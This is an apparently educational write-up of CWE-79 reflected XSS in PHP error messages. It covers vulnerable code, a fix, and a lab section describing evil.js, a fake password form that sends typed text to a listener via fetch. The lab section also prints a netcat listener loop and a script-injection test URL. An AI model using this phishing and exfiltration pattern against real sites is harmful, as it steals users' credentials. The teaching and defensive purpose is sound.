# CWE-79: Improper Neutralization of Input During Web Page Generation With Error Messages

## What is the weakness?

[CWE-79](https://cwe.mitre.org/data/definitions/79.html) (Cross-site Scripting, or XSS) happens when a web application puts user-controlled input into a page without neutralizing it for the context where it appears. The browser then treats that input as markup or script instead of as plain text, so an attacker can run JavaScript in the victim's browser under the site's origin.

This variant is specific to **error messages**. Applications often echo the offending input back in an error, for example "Undefined index: ..." or "Unknown file: ...". If that message is generated without escaping, the error itself becomes an injection point, and it is easy to overlook because error paths are rarely tested for XSS.

## The vulnerable code

`file.php`:

```php
<?php
if (isset($_GET['index'])) {
    $array = array(
        1 => 'archivo1.txt',
        2 => 'archivo2.txt',
        3 => 'archivo3.txt',
    );
    echo "<p>El archivo solicitado es <strong>" . $array[$_GET['index']] . "</strong></p>";
    echo '<a href="file.php">Regresar</a>';
} else {
    // menu of links
}
```

### Why it is vulnerable

- `$_GET['index']` comes straight from the URL, so anyone can control it.
- When `index` is not 1, 2 or 3, PHP does not find the key in `$array`. With error display enabled, PHP prints a warning such as `Warning: Undefined array key "<value>"`, and that warning contains the raw value the user sent.
- The warning is written into the HTML page without escaping. A `index` value containing `<script>` or an HTML event attribute is therefore executed by the browser when the page loads.
- The same pattern is also present in the normal path: `$array[...]` is echoed directly, though the lookup there only returns the fixed filenames, so the main risk is the error output.

Because the injected code runs in the context of the page's origin, it can read the page, the DOM, and anything the browser can access for that site.

## Lab: what `evil.js` demonstrates

`evil.js` is a teaching example for the impact of XSS. It is loaded by a script tag that the injected input places into the page:

```html
<script defer src="evil.js"></script>
```

Because the `index` value is reflected unescaped in the error output, the browser parses that tag as part of the page and fetches `evil.js` from the attacker-controlled host. Once loaded, the script does three things:

1. **Replaces the page content.** It sets `.container` to `display: none`, hiding the real application content, and inserts a fake "Escriba su contraseña para continuar viendo" (enter your password to keep viewing) form at the end of the body.
2. **Captures input.** It listens for `keypress` and `blur` on the password field. Every fourth keypress, and whenever the field loses focus, it takes the current value of the field.
3. **Exfiltrates the value.** It sends that value to the listening server with `fetch(iplinux + secret.value)`, so the typed text appears in the request path on the listener.

The result is a credential-phishing scenario that runs under the vulnerable site's origin, which is why the injection matters more than the fake form itself.

This is a credential-capture demonstration. Use it only in an isolated lab that you own or are authorized to test. It should never be pointed at real users or real systems.

The listening server is a separate Linux machine on the lab network. It runs the following loop, which accepts a connection on port 8000, prints the request it receives, replies with a fixed HTTP response, and repeats:

```sh
while true; do printf 'HTTP/1.2 200 OK\n\n%s' | netcat -l 8000; done
```

Each request from `evil.js` shows up in the listener's output, which is how the captured values were collected in the lab. The listener does nothing to cause the vulnerability; the real defect being demonstrated is the unescaped error output above.

Notes for the lab:

- The server address in `evil.js` is hard-coded to a link-local address. Change it to the address of your own lab machine before running the demo.
- The script sends every few keystrokes and on blur, so a single password may be captured in several requests.

## The fix

Escape everything that is printed, and avoid printing raw input at all when a lookup fails:

```php
<?php
if (isset($_GET['index'])) {
    $array = array(
        1 => 'archivo1.txt',
        2 => 'archivo2.txt',
        3 => 'archivo3.txt',
    );

    $index = filter_input(INPUT_GET, 'index', FILTER_VALIDATE_INT);

    if ($index !== false && $index !== null && isset($array[$index])) {
        echo "<p>El archivo solicitado es <strong>" . htmlspecialchars($array[$index], ENT_QUOTES, 'UTF-8') . "</strong></p>";
    } else {
        echo "<p>Archivo no válido.</p>";
    }
    echo '<a href="file.php">Regresar</a>';
} else {
    // menu of links
}
```

Notes on the fix:

- `filter_input(..., FILTER_VALIDATE_INT)` and `isset($array[$index])` ensure only the known keys are used. An unknown value gets a fixed message instead of a PHP warning that echoes the input.
- `htmlspecialchars(..., ENT_QUOTES, 'UTF-8')` escapes output for the HTML context, in case the value ever comes from user data.
- In production, turn off error display so that warnings are never sent to the browser, for example with `display_errors = Off` in `php.ini`, and log errors to a file instead.
- Set a [Content Security Policy](https://developer.mozilla.org/docs/Web/HTTP/CSP) that blocks inline scripts and scripts from unknown hosts. This limits the damage if an XSS bug is missed.

## Verifying the bug and the fix

Open `file.php` in a PHP server (for example `php -S localhost:8080` in the folder), then request:

```
http://localhost:8080/file.php?index=<script>alert(1)</script>
```

With error display on, the vulnerable version prints a warning containing the unescaped script, and the alert runs. The fixed version prints a fixed message and no script runs.

I have not run either version myself, so these results are what the code is expected to do, not observed output.

## Related weaknesses

- [CWE-79](https://cwe.mitre.org/data/definitions/79.html): Improper Neutralization of Input During Web Page Generation (this document)
- [CWE-80](https://cwe.mitre.org/data/definitions/80.html): Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
- [CWE-209](https://cwe.mitre.org/data/definitions/209.html): Generation of Error Message Containing Sensitive Information
